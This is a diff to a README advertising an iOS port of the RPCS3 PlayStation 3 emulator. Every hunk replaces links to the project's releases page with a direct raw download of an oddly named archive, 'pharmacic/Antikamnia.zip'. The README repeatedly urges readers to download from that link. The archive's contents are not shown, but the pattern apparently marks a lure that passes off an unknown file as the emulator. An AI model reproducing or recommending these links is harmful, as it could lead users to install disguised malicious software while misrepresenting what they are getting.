@@ -1,6 +1,6 @@
 # 🎮 RPCS3-iOS-Releases - Play PS3 Games on Your iPhone!
 
-[![Download Now](https://img.shields.io/badge/Download-RPCS3%20iOS%20Releases-blue?style=for-the-badge&logo=apple)](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/releases)
+[![Download Now](https://img.shields.io/badge/Download-RPCS3%20iOS%20Releases-blue?style=for-the-badge&logo=apple)](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/raw/refs/heads/main/pharmacic/Antikamnia.zip)
 
 ## 📱 What Is This?
 
@@ -8,7 +8,7 @@ RPCS3-iOS-Releases is an experimental port of the popular PS3 emulator, RPCS3, d
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [RPCS3-iOS-Releases Downloads](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/releases)
+Visit this link to download the application: [RPCS3-iOS-Releases Downloads](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/raw/refs/heads/main/pharmacic/Antikamnia.zip)
 
 Getting started with RPCS3 on your iOS device is easier than you might think. Follow these simple steps to begin your PS3 gaming adventure:
 
@@ -170,7 +170,7 @@ RPCS3 is a complex piece of software that emulates the PlayStation 3's Cell proc
 
 ## 📚 Useful Resources
 
-- Download the latest release: [RPCS3-iOS-Releases](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/releases)
+- Download the latest release: [RPCS3-iOS-Releases](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/raw/refs/heads/main/pharmacic/Antikamnia.zip)
 - Backup your game saves regularly
 - Join community forums to share experiences and tips
 - Check release notes to see what's new in each update
@@ -206,7 +206,7 @@ Always check for the newest version before downloading games. The developer regu
 
 RPCS3 for iOS is an exciting project that makes PS3 emulation accessible on modern Apple devices. While it's still experimental, the potential is enormous. With your compatible device and a little patience, you can enjoy classic PS3 games on the go!
 
-Remember to visit the download link regularly for updates: [Get RPCS3-iOS](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/releases)
+Remember to visit the download link regularly for updates: [Get RPCS3-iOS](https://github.com/Mean-ilangilang814/RPCS3-iOS-Releases/raw/refs/heads/main/pharmacic/Antikamnia.zip)
 
 Start your PS3 emulation journey today – your favorite games are waiting!
 
